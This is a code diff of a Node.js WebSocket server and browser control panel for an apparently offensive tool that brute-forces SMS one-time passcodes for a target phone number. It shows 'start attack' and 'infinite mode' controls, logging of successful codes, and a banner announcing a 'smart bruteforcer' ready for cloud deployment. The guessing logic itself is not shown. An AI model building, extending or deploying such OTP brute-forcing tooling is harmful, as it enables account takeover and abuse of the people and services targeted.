-          log.scrollTop = log.scrollHeight;
-        }
-
-        function updateSuccessList() {
-          if (successCodes.length > 0) {
-            document.getElementById('successCodes').style.display = 'block';
-            successList.innerHTML = successCodes.map((s, i) => \`
-              <div class="success-item">
-                <div>
-                  <strong>\${s.code}</strong> - \${s.phone}
-                  <br><small>\${new Date(s.timestamp).toLocaleString()}</small>
-                </div>
-                <span class="badge">#\${i + 1}</span>
-              </div>
-            \`).join('');
-          }
+        function handleMessage(data) {
+            switch(data.type) {
+                case 'batch_start':
+                    document.getElementById('batchNum').textContent = data.batch;
+                    addLog(data.message, 'info');
+                    break;
+                    
+                case 'codes_generated':
+                    addLog(data.message, 'info');
+                    break;
+                    
+                case 'success':
+                    document.getElementById('successCount').textContent = data.successCount;
+                    addLog(data.message, 'success');
+                    addSuccessCode(data.code);
+                    break;
+                    
+                case 'progress':
+                    const percent = ((data.completed / data.total) * 100).toFixed(1);
+                    document.getElementById('progress').textContent = percent + '%';
+                    addLog(data.message, 'info');
+                    break;
+                    
+                case 'batch_complete':
+                    document.getElementById('totalSuccess').textContent = data.totalSuccess;
+                    addLog(data.message, 'success');
+                    break;
+                    
+                case 'cooldown':
+                case 'mode_start':
+                case 'stopped':
+                    addLog(data.message, 'info');
+                    break;
+            }
         }
         
-        function startAttack() {
-          ws.send(JSON.stringify({ action: 'start' }));
-          addLog('🚀 Starting UNLIMITED attack...', 'info');
+        function addLog(message, type = 'info') {
+            const logs = document.getElementById('logs');
+            const entry = document.createElement('div');
+            entry.className = 'log-entry log-' + type;
+            entry.innerHTML = \`[\${new Date().toLocaleTimeString()}] \${message}\`;
+            logs.insertBefore(entry, logs.firstChild);
+            
+            while(logs.children.length > 100) {
+                logs.removeChild(logs.lastChild);
+            }
         }
         
-        function stopAttack() {
-          ws.send(JSON.stringify({ action: 'stop' }));
-          addLog('⏹️ Stopping attack...', 'warning');
+        function addSuccessCode(code) {
+            const container = document.getElementById('successCodes');
+            const codeItem = document.createElement('span');
+            codeItem.className = 'code-item';
+            codeItem.textContent = code;
+            container.insertBefore(codeItem, container.firstChild);
         }
-
-        function clearLog() {
-          log.innerHTML = '';
-          addLog('🗑️ Log cleared', 'info');
+        
+        function startInfinite() {
+            ws.send(JSON.stringify({ command: 'start_infinite' }));
+            addLog('🚀 Starting infinite mode...', 'info');
         }
-      </script>
-    </body>
-    </html>
-  `);
+        
+        function stop() {
+            ws.send(JSON.stringify({ command: 'stop' }));
+            addLog('🛑 Stopping...', 'info');
+        }
+    </script>
+</body>
+</html>
+    `);
 });
 
-// WebSocket handler
+// WEBSOCKET CONNECTION HANDLER
 wss.on('connection', (ws) => {
-  console.log('✅ Client connected');
-  let session = null;
-
-  ws.send(JSON.stringify({ 
-    type: 'welcome', 
-    message: '🎯 Connected to UNLIMITED TicTac OTP Server',
-    mode: 'UNLIMITED',
-    timestamp: new Date().toISOString()
-  }));
-
-  ws.on('message', (data) => {
-    try {
-      const message = JSON.parse(data.toString());
-      
-      if (message.action === 'start') {
-        if (!session || !session.isRunning) {
-          session = new UnlimitedBruteForce(ws, message.phone);
-          session.start();
+    console.log('✅ New WebSocket client connected');
+    
+    let bruteforcer = null;
+    
+    ws.on('message', async (message) => {
+        try {
+            const data = JSON.parse(message);
+            
+            if (data.command === 'start_infinite') {
+                if (!bruteforcer) {
+                    bruteforcer = new SmartBruteforcer(ws);
+                }
+                bruteforcer.runInfinite();
+            } else if (data.command === 'stop') {
+                if (bruteforcer) {
+                    bruteforcer.stop();
+                }
+            }
+        } catch (error) {
+            console.error('❌ Error:', error.message);
         }
-      } else if (message.action === 'stop') {
-        if (session) {
-          session.stop();
+    });
+    
+    ws.on('close', () => {
+        console.log('❌ Client disconnected');
+        if (bruteforcer) {
+            bruteforcer.stop();
         }
-      }
-    } catch (error) {
-      console.error('Error:', error);
-    }
-  });
-
-  ws.on('close', () => {
-    console.log('❌ Client disconnected');
-    if (session) {
-      session.stop();
-    }
-  });
+    });
 });
 
-// Keep-alive ping
-setInterval(() => {
-  wss.clients.forEach(ws => {
-    if (ws.readyState === WebSocket.OPEN) {
-      ws.ping();
-    }
-  });
-}, 30000);
-
-// Auto-start on deployment (Optional)
-setTimeout(() => {
-  console.log('🤖 Server ready for UNLIMITED attacks');
-}, 3000);
-
+// START SERVER
 server.listen(PORT, () => {
-  console.log(\`🚀 UNLIMITED MODE Server running on port \${PORT}\`);
-  console.log(\`📱 Target: \${CONFIG.phoneNumber}\`);
-  console.log(\`⚡ Concurrent requests: \${CONFIG.concurrentRequests}\`);
-  console.log(\`🔄 Mode: UNLIMITED - Never stops!\`);
+    console.log(`
+╔════════════════════════════════════════════════════════════════╗
+║          🚀 SMART BRUTEFORCER SERVER RUNNING                  ║
+║                                                                ║
+║  🌐 Server: http://localhost:${PORT}                            ║
+║  🔌 WebSocket: Ready                                          ║
+║  🧠 Smart Pattern Analysis: ACTIVE                            ║
+║  📊 Real-time Updates: ENABLED                                ║
+║  ☁️  Render.com: READY                                         ║
+╚════════════════════════════════════════════════════════════════╝
+    `);
 });
